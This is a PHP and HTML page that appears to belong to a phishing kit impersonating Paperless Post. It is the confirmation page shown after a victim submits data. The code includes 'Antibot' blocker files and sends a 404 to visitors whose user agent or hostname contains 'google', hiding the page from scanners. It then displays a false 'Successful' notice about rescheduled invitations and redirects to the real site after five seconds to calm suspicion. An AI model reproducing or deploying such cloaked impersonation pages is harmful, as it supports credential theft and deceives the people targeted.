
<?php
error_reporting(0);
session_start();
include('Antibot/pro.php');
include('Antibot/blocker.php');

include('Antibot/blocker_1.php');
include('Antibot/blocker_2.php');
include('Antibot/blocker_3.php');
include('Antibot/blocker_4.php');


if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'google') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?>
<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=2.0, user-scalable=1">
        <title>Paperless Post®: Success</title>
        <link href="assets/favicon.ico" rel="shortcut icon">
        <link rel="stylesheet" href="assets/all.min.css">
        <link rel="stylesheet" href="assets/layout5.css">
        <style>html {
    min-height: 100%
}


    body {
        background-image: url('assets/imageedit_3_2453183620.jpg');
        background-repeat: no-repeat;
        background-size: cover;
        background-attachment: fixed;
        background-position: bottom right;
    }


    body {
        background-color:  ;
    }

.container-fluid.heading {
    width: 66.6666666666667%;
    padding: 6% 0 0 0;
}


    .heading .col-xs-12 {
        background-color:  ;
        padding: 1em;
        border-radius: 8px 8px 0 0;
    }


    .btn-primary {
        background-color:   !important;
    }


    .btn-primary {
        color:   !important;
    }


    .btn-primary {
        border-color:   !important;
    }


    .btn-secondary {
        background-color:   !important;
    }


    .btn-secondary {
        color:   !important;
    }


    .btn-secondary {
        border-color:   !important;
    }

@media screen and (max-width: 991px) {
    .container-fluid.heading {
        width: 83.3333333333333%;
    }
}

@media screen and (max-width: 767px) {
    .container-fluid.heading {
        width: 100%;
        padding: 0 0 0 0;
    }
}

.container-fluid + .container {
    background-color: #f6f6f6;
}

.outage-msg{
    font-size: 19px;
}

</style>

        
    </head>
    <body>
        <div class="modal fade"  id="myModal" tabindex="-1" role="dialog">
            <div class="modal-dialog"  role="document">
                <div class="modal-content">
                    <div class="modal-body">
                        <div class="row">
                            <div class="col-xs-12 congrats">
                                <i class="icon-ok-circle" aria-hidden="true" id="modal-title" style="font-size:30px"></i>
                            </div>
                            <div class="col-xs-12" id="success_message"></div>
                            <div class="col-xs-12" id="modal-body"></div>
                        </div>
                    </div>
                    
                </div>
            </div>
        </div>

        <div class="container-fluid heading">
            <div class="col-xs-12" style="text-align: center">
                <img id="logo-large" src="assets/imageedit_5_9844662071.png" style="max-width: 150px; height: auto;" alt="Q2 CI Environment">
            </div>
        </div>
        <br><br>
        <div class="container col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-12">
            <div class="row" style="margin-bottom: 40px;">
                <div class="clearfix col-xs-12 col-sm-10 col-sm-offset-1">

                    <p id="page_message" class="page-message"> </p>
                    <div class="sr-only" tabindex="0">All fields are required unless otherwise mentioned.</div>
                    <ul id="nav-tabs" class="nav nav-tabs" style="display: none;"></ul>
                </div>
                <div class="clearfix col-xs-12 col-sm-10 col-sm-offset-1">
                    <noscript>
                        <style>
                            .btn {display: none;}
                        </style>
                        <div id="alertBox" class="alertBox">
                            <div class="row">
                                <div class="col-xs-2 col-sm-1 col-md-1">
                                    <i class="icon-warning-sign"></i>
                                </div>
                                <div class="col-xs-10 col-sm-11 col-md-11 modal-msg">JavaScript is disabled.  Please enable JavaScript to correctly display the page.</div>
                            </div>
                        </div>
                    </noscript>
                    
                        <div id="q2-form-fields" class="tab-content"><div id="personal"><form autocomplete="off" class="q2-form fv-form fv-form-bootstrap" name="OnlineEnrollment_personal" id="OnlineEnrollment_personal" action="javascript:void(0);" method="post" onsubmit="return submit_form('personal');" <="" form="" novalidate="novalidate"><button type="submit" class="fv-hidden-submit" style="display: none; width: 0px; height: 0px;" aria-hidden="true"></button><!-- Alert Area --> <div id="OnlineEnrollment_personalalertBox" class="alertBox hidden"><div class="row">
                        
                        <div class="col-xs-2 col-sm-1 col-md-1"><i class="icon-warning-sign" aria-hidden="true"></i></div>
                        
                        <div class="col-xs-10 col-sm-11 col-md-11 modal-msg"></div>
                    
                    </div> </div><!-- End Alert Area -->
                    <p style="text-align: center; font-size: 21px; font-weight: bold; color:#005ac8;">Successful </p>
                    <div class="col-xs-12 groupHeading" id="section0">
                        
                    <div class=""> </div></div>
                        
                        
                        <style>


.container {
    text-align: center;
}

.circle {
    display: flex;
    width: 100px;
    height: 100px;
    background-color: #005ac8; /* Green color for the circle background */
    border-radius: 50%; /* Make it a circle */
    padding: 20px;
    box-sizing: border-box;
    align : center;
    justify-content: center;
    align-items: center
}

.checkmark {
    width: 60px; /* Adjust the size of the checkmark image */
    height: 60px;
    fill: #ffffff; /* White color for the checkmark */
}
</style>
<script>
// Auto-redirect after 5 seconds (5000 milliseconds)
setTimeout(function() {
window.location.href = "https://www.paperlesspost.com/";
}, 5000);
</script>
<br></br>
<center>
<div class="circle">
    <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
        <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none" stroke="#ffffff" stroke-width="2"/>
        <path class="checkmark-check" fill="none" stroke="#ffffff" stroke-width="2" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
    </svg>
</div></center>
<br></br>


            <p style="text-align: center; font-size: 15px; font-weight: bold;">Due to higher traffic on our website and a new invitation policy, all new invitations have been rescheduled. </p>
            <p style="text-align: center; font-size: 15px; font-weight: bold;">You will receive notification regarding the rescheduling of your invitation through your registered email address.</p>

                        

                        
                        
                        
                    </form></div></div>
                    
                </div>
            </div>
        </div>
        
        <div id="sr-message" aria-live="assertive" class="sr-only"></div>
    

</body></html>